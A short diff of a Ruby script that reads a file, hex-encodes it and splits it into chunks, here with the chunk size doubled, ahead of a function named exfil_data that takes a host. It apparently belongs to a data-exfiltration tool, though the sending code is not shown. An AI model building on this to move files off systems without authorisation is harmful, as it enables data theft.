@@ -10,7 +10,7 @@
 def chunked_data(fname)
   data = File.open(fname, "rb") {|f| f.read f.stat.size}
   hexified = data.each_byte.map {|x| "%0x" % x.ord}.join
-  hexified.scan(/.{1,1400}/)
+  hexified.scan(/.{1,2800}/)
 end
 
 def exfil_data(host,fname)
